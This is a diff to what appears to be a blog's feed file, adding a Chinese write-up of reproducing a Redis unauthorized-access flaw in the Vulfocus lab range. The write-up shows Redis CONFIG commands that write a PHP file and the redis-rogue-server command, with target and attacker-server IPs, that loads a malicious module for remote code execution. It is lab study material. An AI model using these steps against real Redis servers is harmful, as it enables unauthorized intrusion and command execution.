@@ -212,6 +212,31 @@
     
     
     <entry>
+      <title>redis 未授权访问 (CNVD-2019-21763)</title>
+      <link href="/2024/06/03/vulfocus%E9%9D%B6%E5%9C%BAredis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BCNVD-2015-07557/"/>
+      <url>/2024/06/03/vulfocus%E9%9D%B6%E5%9C%BAredis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BCNVD-2015-07557/</url>
+      
+        <content type="html"><![CDATA[<h1 id="redis-未授权访问-cnvd-2019-21763">redis 未授权访问(CNVD-2019-21763)</h1><p>Redis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。由于在Reids4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so文件，从而实现远程代码执行。</p><h3 id="漏洞复现">漏洞复现</h3><p>VULFOCUS靶场是易于搭建的，可以看往期文章</p><p>由于目标系统的权限不够redis用户无法写计划任务和公钥，而且也没有开放ssh端口。主从复制getshell，写入恶意的so文件达到执行系统命令的目的。</p><p><code>利用条件</code>：需要web目录有读写权限，只有读权限会失败</p><p>github上有一键可以利用的脚本https://github.com/n0b0dyCN/redis-rogue-server.git</p><p>工具连接：redis-rogue-server</p><p>https://github.com/qishibo/AnotherRedisDesktopManager/releases</p><p>下载 Another-Redis-Desktop-Manager-win-1.7.0-x64</p><p><imgsrc="https://pic.imgdb.cn/item/6741e801d29ded1a8c28cc7c.png" /></p><p><imgsrc="https://pic.imgdb.cn/item/6741e88dd29ded1a8c293bb5.png" /></p><p>向目标写入文件（前提是目标有网站）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /tmp               #创建临时目录</span><br><span class="line"></span><br><span class="line">config set dbfilename 1.php       #写入文件</span><br><span class="line"></span><br><span class="line">set test &quot;&lt;?php  phpinfo(); ?&gt;&quot;   #向文件中写入内容</span><br><span class="line"></span><br><span class="line">bgsave                             #保存</span><br><span class="line"></span><br><span class="line">save                               #保存</span><br></pre></td></tr></table></figure><p>能够执行以上命令</p><p>证明web目录具有写权限，可以进行利用</p><p><imgsrc="https://pic.imgdb.cn/item/6741ea3bd29ded1a8c2a9bbb.png" /></p><p>确认靶机有可写权限后，</p><p>利用：攻击机进入到cd redis-rogue-server文件夹里面</p><p>python3 redis-rogue-server.py –rhost 目标IP –rport 目标端口 –lhost攻击者服务器IP</p><p>成功后，可以执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /tmp</span><br></pre></td></tr></table></figure><p>即可得到flag</p><p><imgsrc="https://pic.imgdb.cn/item/6741eac7d29ded1a8c2b18f2.png" /></p><p>所有环境均在本地实现，部分源码来自于csdn博客，仅供学习研究，不要在未授权的外网环境，测试他人服务</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>毕业旅行</title>
       <link href="/2024/06/03/%E6%AF%95%E4%B8%9A%E6%97%85%E8%A1%8C/"/>
       <url>/2024/06/03/%E6%AF%95%E4%B8%9A%E6%97%85%E8%A1%8C/</url>
